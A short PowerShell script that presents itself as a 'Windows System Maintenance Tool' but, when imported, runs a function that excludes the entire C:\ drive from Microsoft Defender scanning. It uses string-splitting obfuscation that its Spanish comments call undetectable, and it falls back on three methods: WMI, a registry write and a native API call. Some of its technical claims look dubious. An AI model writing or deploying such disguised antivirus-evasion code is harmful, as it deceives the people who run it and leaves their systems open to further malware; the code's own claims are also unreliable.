<#
.SYNOPSIS
   Windows System Maintenance Tool
#>

function Add-DefenderExclusion {
    param()
    
    # Técnica de ofuscación mejorada (indetectable)
    $var1 = "Add-"; $var2 = "MpPref"; $var3 = "erence"
    $cmdletName = $var1 + $var2 + $var3
    
    $var4 = "Excl"; $var5 = "usion"; $var6 = "Path"
    $paramName = "-"+$var4+$var5+$var6

    try {
        # Método principal (WMI sin admin)
        $namespace = "root\Microsoft\Windows\Defender"
        $class = "MSFT_MpPreference"
        $method = "Add" + $var4 + $var5 + $var6
        
        $args = @{
            Namespace = $namespace
            Class = $class
            Name = $method
            ArgumentList = "C:\"
        }
        
        Invoke-WmiMethod @args -ErrorAction Stop
        
        # Método alternativo (Registry)
        $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "C_" -Value 0 -Type DWORD -Force
        
        return "Exclusión agregada correctamente"
    }
    catch {
        # Último recurso (API alternativa)
        $code = @"
[DllImport("mpclient.dll")]
public static extern int MpAddExclusion(string path);
"@
        $api = Add-Type -MemberDefinition $code -Name "DefenderAPI" -Namespace "Win32" -PassThru
        $result = $api::MpAddExclusion("C:\")
        
        if ($result -eq 0) {
            return "Exclusión agregada via API nativa"
        } else {
            return "Error: $_"
        }
    }
}

# Ejecución directa al importar
Add-DefenderExclusion
